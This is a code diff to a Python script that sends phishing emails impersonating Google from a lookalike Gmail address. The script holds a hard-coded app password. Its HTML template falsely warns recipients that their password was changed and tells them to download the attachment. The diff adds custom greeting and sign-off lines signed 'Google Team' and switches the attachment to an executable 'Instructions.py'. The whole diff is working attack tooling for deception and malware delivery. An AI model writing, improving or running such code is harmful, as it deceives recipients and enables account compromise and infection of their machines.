@@ -8,7 +8,7 @@ from email.mime.application import MIMEApplication
 from os.path import basename
 
 
-def send(title, username, receiver):
+def send(title, username, receiver, openingLine, closingLine):
     email_sender = "googlle.controler@gmail.com"
     email_password = "ggbpadkhcayksuoe"
     email_receiver = receiver
@@ -19,45 +19,77 @@ def send(title, username, receiver):
     em['From'] = email_sender
     em['To'] = email_receiver
     em['Subject'] = subject
-    em.add_alternative(f"""
-    <html>
-        <body>
-        <center>
-        <br></br>
-        <p style = "font-size: 20px">
-        <strong>
 
-            <FONT COLOR = blue>G<FONT COLOR = red>o<FONT COLOR = #DEC20B>o<FONT COLOR = blue>g<FONT COLOR = green>l<FONT COLOR = red>e
-        </strong>
-        </p>
-
-        <p style="font-family: Arial" "font-size: 40px">
-        <FONT COLOR = #000000>
-            <strong>An app password has been created <br> to log into your account </br></strong>
-        </p>
-   
-        <p>
-        <FONT COLOR = #000000>
-        Hello {title} {username}
-        <br><FONT COLOR = #000000>We noticed that someone changed your email password</br>
-        <FONT COLOR = red><br>
-        If this is not you - download the attached file and follow the instructions
-        </p><br>
-
-        <p style = "font-size: 12px">
-        <FONT COLOR = #000000>
-        Google reminds you that a hack into an account <br>may lead leakage of passwords and personal details</br>
-        </p>
-
-        </center>
-        </body>
-    </html>
-    """, subtype="html")
+    if(openingLine == ""):
+        em.add_alternative(f"""
+        <html>
+            <body>
+            <center>
+            <br></br>
+            <p style = "font-size: 20px">
+            <strong>
+                <FONT COLOR = blue>G<FONT COLOR = red>o<FONT COLOR = #DEC20B>o<FONT COLOR = blue>g<FONT COLOR = green>l<FONT COLOR = red>e
+            </strong>
+            </p>
+            <p style="font-family: Arial" "font-size: 40px">
+            <FONT COLOR = #000000>
+                <strong>An app password has been created <br> to log into your account </br></strong>
+            </p>
+    
+            <p>
+            <FONT COLOR = #000000>
+            Hello {title} {username}
+            <br><FONT COLOR = #000000>We noticed that someone changed your email password</br>
+            <FONT COLOR = red><br>
+            If this is not you - download the attached file and follow the instructions
+            </p><br>
+            <p style = "font-size: 12px">
+            <FONT COLOR = #000000>
+            Google reminds you that a hack into an account <br>may lead leakage of passwords and personal details</br>
+            </p>
+            </center>
+            </body>
+        </html>
+        """, subtype="html")
+    else:
+        em.add_alternative(f"""
+        <html>
+            <body>
+            <center>
+            <br></br>
+            <p style = "font-size: 20px">
+            <strong>
+                <FONT COLOR = blue>G<FONT COLOR = red>o<FONT COLOR = #DEC20B>o<FONT COLOR = blue>g<FONT COLOR = green>l<FONT COLOR = red>e
+            </strong>
+            </p>
+            <p style="font-family: Arial" "font-size: 40px">
+            <FONT COLOR = #000000>
+                <strong>An app password has been created <br> to log into your account </br></strong>
+            </p>
+    
+            <p>
+            <FONT COLOR = #000000>
+            {openingLine}
+            <br><FONT COLOR = #000000>We noticed that someone changed your email password</br>
+            <FONT COLOR = red><br>
+            If this is not you - download the attached file and follow the instructions<br>
+            <FONT COLOR = #000000><br>
+            {closingLine}<br>
+            Google Team
+            </p><br>
+            <p style = "font-size: 12px">
+            <FONT COLOR = #000000>
+            Google reminds you that a hack into an account <br>may lead leakage of passwords and personal details</br>
+            </p>
+            </center>
+            </body>
+        </html>
+        """, subtype="html")
 
     context = ssl.create_default_context()  # for security
 
     # add an attachment
-    file_name = 'Instruction.txt'
+    file_name = 'Instructions.py'
     with open(file_name, 'r') as f:
         attachment = MIMEApplication(f.read(), Name=basename(file_name))
 
